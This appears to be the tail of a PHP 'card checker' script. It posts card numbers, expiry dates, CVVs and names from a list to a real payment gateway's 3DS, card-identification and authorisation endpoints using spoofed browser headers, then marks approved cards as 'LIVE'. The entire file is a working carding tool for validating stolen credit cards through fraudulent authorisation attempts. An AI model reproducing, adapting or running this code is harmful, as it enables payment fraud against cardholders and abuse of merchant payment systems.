    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://pay.realexpayments.com/3ds2/verifyEnrolled',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: */*',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'Origin: https://pay.realexpayments.com',
            'Referer: https://pay.realexpayments.com/card.html?guid='.$guid,
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "pas_cctype=VISA&pas_pareq=&pas_acsurl=&pas_termurl=&encryptMD=&verifyMessage=&verifyResult=&verifyEnrolled=&pas_ccnum=$cc&cardIdentifyError=&pas_expiry=&pas_cccvc=&pas_issuenumber=&pas_ccname=&guid=$guid&dccchoice=&dccrate="
    ));
    $verifyEnrolled = curl_exec($ch);
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://pay.realexpayments.com/api/cardIdentification',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: */*',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'Origin: https://pay.realexpayments.com',
            'Referer: https://pay.realexpayments.com/card.html?guid='.$guid,
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "pas_cctype=VISA&pas_pareq=&pas_acsurl=&pas_termurl=&encryptMD=&verifyMessage=&verifyResult=&verifyEnrolled=&pas_ccnum=$cc&cardIdentifyError=&pas_expiry=&pas_cccvc=&pas_issuenumber=&pas_ccname=&guid=$guid&dccchoice=&dccrate="
    ));
    $cardIdentification = curl_exec($ch);
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://pay.realexpayments.com/api/auth',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: */*',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'Origin: https://pay.realexpayments.com',
            'Referer: https://pay.realexpayments.com/card.html?guid='.$guid,
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "pas_cctype=VISA&pas_pareq=&pas_acsurl=&pas_termurl=&encryptMD=&verifyMessage=&verifyResult=&verifyEnrolled=&pas_ccnum=$cc&cardIdentifyError=&pas_expiry=$mm%2F".substr($yy, 2, 4)."&pas_cccvc=$cvv&pas_issuenumber=&pas_ccname=$fname+$lname&guid=$guid&dccchoice=&dccrate=&browserJavaEnabled=false&browserLanguage=en-US&screenColorDepth=24&screenHeight=1080&screenWidth=1920&timezoneUtcOffset=-480&paymentFormHeight=558&paymentFormWidth=600"
    ));
    $auth = json_decode(curl_exec($ch), true);
    curl_close($ch);

    $code = $auth['data']['response']['result'];
    $authCode = $auth['data']['response']['authcode'];
    $message = $auth['data']['response']['message'];
    $cvvResult = $auth['data']['response']['cvnresult'];

    if($code == "00") {

        echo '<tr><td><span class="badge badge-success badge-pill">LIVE</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">CVV: '.$cvvResult.' | Message: '.$message.'</span></td></tr><br>';

    } else {

        echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">Message: '.$message.' | CVV: '.$cvvResult.'</span></td> <td><span class="badge badge-info badge-pill">Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';

    }
    unlink("cookies/$cookie.txt");
?>
